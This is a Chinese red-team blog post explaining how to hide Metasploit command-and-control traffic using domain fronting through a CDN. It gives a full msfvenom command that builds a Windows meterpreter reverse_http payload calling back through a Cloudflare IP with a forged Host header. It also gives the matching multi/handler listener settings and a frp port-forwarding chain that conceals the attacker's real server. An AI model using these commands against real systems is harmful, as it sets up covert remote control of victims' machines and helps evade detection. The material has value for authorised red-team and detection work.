---
title: "msf stagers开发不完全指北(四): msf 中使用域前置技术隐藏流量"
date: 2020-07-17 18:01:00
tags:
- msf
- 工具
- 红队
categories:
- 开发
---

前几篇都是说了下如何采用不同的语言开发 reverse_tcp 第二阶段，接下来将慢慢分析 reverse_http，这篇文章并不会围绕 stagers 进行讲解，这篇文章只是半埋上我之前挖的一个坑，关于域前置技术如何在 msf 中进行应用。

<!--more-->

## 域前置技术介绍


域前置技术（Domain-Fronting）顾名思义，把域名放在前面，流量的前面，那么我们应该如何做到这件事情，这个一般就是利用各大 cdn 服务了。


cdn 技术我不用做过多介绍，相信大家给自己的网站上 cdn 都会上，简略来说原理的话，在域名注册商那里把 ns 记录，也就是 dns 解析服务器指向到你选择的 cdn 服务商，然后 cdn 就可以接管你的域名解析了，通过不同的缓存分流策略，把流量经过他的服务器后再转发给我们自己，也就是 cdn 后面的真实ip我们是不容易找到的。


那么应用到 C2 上，我们 C2 服务器也可以挂在 cdn 后面，流量通过 cdn 转发回来。


具体更为详细的介绍可以参见 [红队行动之鱼叉攻击-倾旋](https://payloads.online/archivers/2020-02-05/1#domain-fronting)


## 基础配置


首先不管怎样你需要有一个服务器，以及一个加了 cdn 的域名执行你服务器


这里我假设我们持有的域名为 test.akkuman.com，域名配好 cdn 指向的服务器是 1.1.1.1


这里你是把服务器架在 msf 上面还是内网穿透打通端口，这个看自己喜好


我这里是 msf 位于其他地方 2.2.2.2，然后 2.2.2.2 的 5555 端口通过 frp 映射到 1.1.1.1 的 80 端口上。


5555 端口是我们待会 msf 监听的端口，80 端口是因为访问域名，http 协议，访问80。


因为这些流量会通过 cdn 先转发到我们主机上的 80 端口，然后 80 端口上的流量会通过 frp 处理后送到我们本机监听的 5555 端口上。


## 生成 msf payload


基础一些配置做好之后，我们可以生成 payload 了。


首先我们需要得到一个 cdn 的 ip，因为 cdn 是依靠 http header 中的 Host 头进行流量转发的，所以我们只需要 ping 一下我们加了 cdn 的域名即可获得一个 ip，这里我是用的 cloudflare，获得的一个 ip 为 172.67.207.124


```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=172.67.207.124 LPORT=80 HttpHostHeader=test.akkuman.com -f exe -o ~/payload.exe
```


这里 LHOST 为我们获取的 cdn ip，因为是 http 协议的 payload，访问域名是访问 80 端口，LPORT 我们设置为 80


HttpHostHeader 选项为这个生成的 payload 使用 http 协议回连到 cdn ip 时 http header 所使用的 Host 头，还记得我们刚才说的 cdn 如何识别域名进行流量转发吗，这个就主要是为了 cdn 能够把流量转回到我们自己的服务器


## 创建监听器


msf 在监听中有一些配置需要说明一下


```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(multi/handler) > set lhost 172.67.207.124
lhost => 172.67.207.124
msf5 exploit(multi/handler) > set lport 80
lport => 80
msf5 exploit(multi/handler) > set HttpHostHeader test.akkuman.com
HttpHostHeader => test.akkuman.com
msf5 exploit(multi/handler) > set OverrideRequestHost true
OverrideRequestHost => true
msf5 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf5 exploit(multi/handler) > set ReverseListenerBindPort 5555
ReverseListenerBindPort => 5555
msf5 exploit(multi/handler) > run
```


- 首先 lhost 为给 payload 返回第二阶段载荷时填入的 ip 地址，即第二阶段会回连到这个 ip


- lport 为给 payload 返回第二阶段载荷时填入的 port，即第二阶段会回连到这个端口


- HttpHostHeader 前面说过，是 payload 回连到这个 ip 和 port 时在 http header 中填入的 Host 头


- OverrideRequestHost 这个选项需要设置为 true，主要是因为 msf 的历史原因，msf 默认是使用传入请求 http header 中的 Host 字段来作为第二阶段的配置，也就是第二阶段会采用建立连接时传入请求的 Host，这种默认行为在大多数请求下没问题，具体可以自行测试，具体是需要 cdn 回连到我们真实 ip 时传递的域名是我们想要的，这个参数设置为 true 可以让 msf 忽略传入请求的 Host 头，而使用我们在 HttpHostHeader 中设置的


- ReverseListenerBindAddress 和 ReverseListenerBindPort 参数主要是因为我的环境问题，我是通过 frp 把 1.1.1.1:80 穿透到了本地 (2.2.2.2) 的 127.0.0.1:5555，如果你的 msf 直接在 1.1.1.1 上，那么 duck 不必这么做，直接监听 80 就好


ReverseListenerBindAddress 这个参数其实设置不设置都没关系，但是不设置的话会有个小报错，


```
[-] Handler failed to bind to 172.67.207.124:80
```


这是因为 handler 无法将 cdn 的 ip 绑定到LHOST，因为这个 ip 在我们服务器上不存在，绑定失败就会提示这个，然后继续绑定 0.0.0.0。如果想要在界面上不显示这个错误，需要设置 ReverseListenerBindAddress 为 0.0.0.0 或者 127.0.0.1 之类的


可以看到，当我们不设置 ReverseListenerBindAddress 和 ReverseListenerBindPort 时会出现上面的报错 `Handler failed to bind to 172.67.207.124:80`


也就是 handler 在本地上是希望监听 80 的，而 1.1.1.1:80 上面的流量是转发到我们服务器 (2.2.2.2) 本机的 5555 端口上的。


所以我们的监听程序实际上需要监听在 5555 端口上，所以需要设置 ReverseListenerBindPort 参数


上面的 lhost 和 lport 其实主要是为了第二阶段回送服务的。


## 实际效果


```
paylaod.exe <-> cdnip:80(Host: test.akkuman.com) <-> 1.1.1.1:80 <-> frp[1.1.1.1:7000<->2.2.2.2:随机端口] <-> 127.0.0.1:5555
```


![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/f307ddbb192427e72e620228ede6a747..png)


![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/02253a789ae1ae4a4bdaddd3a019d614..png)


可以看到不管是请求第二阶段还是后续的心跳包，都是有带上 Host 头，流经 cdn 服务器的，这样我们就达到了隐藏自身的效果


那么 msf 会话这边呢


![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/68c7066f12a652f6c55ce8f75b50e27f..png)



可以看到，也是可以正常使用的